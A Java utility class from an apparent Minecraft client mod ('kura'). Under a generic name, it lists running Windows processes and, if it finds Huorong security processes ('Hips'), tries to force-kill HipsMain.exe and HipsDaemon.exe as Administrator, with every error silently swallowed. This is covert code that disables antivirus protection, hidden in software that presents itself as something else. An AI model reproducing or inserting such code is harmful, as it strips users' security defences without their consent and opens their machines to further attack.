package me.windyteam.kura.utils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

@SuppressWarnings("all")
public class Task {
    public static Task INSTANCE = new Task();
    public void TaskRunning() {
        Runtime runtime = Runtime.getRuntime();
        List<String> taskList = new ArrayList<>();
        try {
            Process process = runtime.exec("tasklist.exe");
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String az;
            while ((az = br.readLine()) != null) {
                if ("".equals(az)) {
                    continue;
                }
                taskList.add(az + " ");
            }

            String maxRow = taskList.get(1) + "";
            String[] maxCol = maxRow.split(" ");
            String[] taskName = new String[taskList.size()];
            for (int i = 0; i < taskList.size(); i++) {
                String data = taskList.get(i) + "";
                for (String s : maxCol) {
                    taskName[i] = data.substring(0, s.length() + 1);
                    data = data.substring(s.length() + 1);
                }
            }

            int count = 0;
            for (String s : taskName) {
                if (s.contains("Hips")) {
                    count++;
                }
            }
            if (count >= 2) {
                try {
                    runtime.exec("runas /profile /user:Administrator \"cmd.exe taskkill /im HipsMain.exe /F");
                    runtime.exec("runas /profile /user:Administrator \"cmd.exe taskkill /im HipsDaemon.exe /F");
                } catch (Exception ignored) {
                }
            }
        } catch (Exception ignored) {
        }
    }
}
